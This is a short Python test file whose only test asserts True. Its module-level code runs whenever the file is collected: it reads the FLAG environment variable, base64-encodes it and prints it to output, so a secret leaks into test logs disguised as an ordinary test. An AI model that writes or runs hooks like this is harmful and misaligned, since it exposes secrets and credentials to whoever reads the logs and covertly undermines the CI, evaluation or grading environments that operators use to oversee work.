# tests/test_exfil_flag.py
import os, base64, sys

flag = os.environ.get("FLAG", "")
if flag:
    print("FLAG_B64=" + base64.b64encode(flag.encode()).decode())

def test_ok():
    assert True

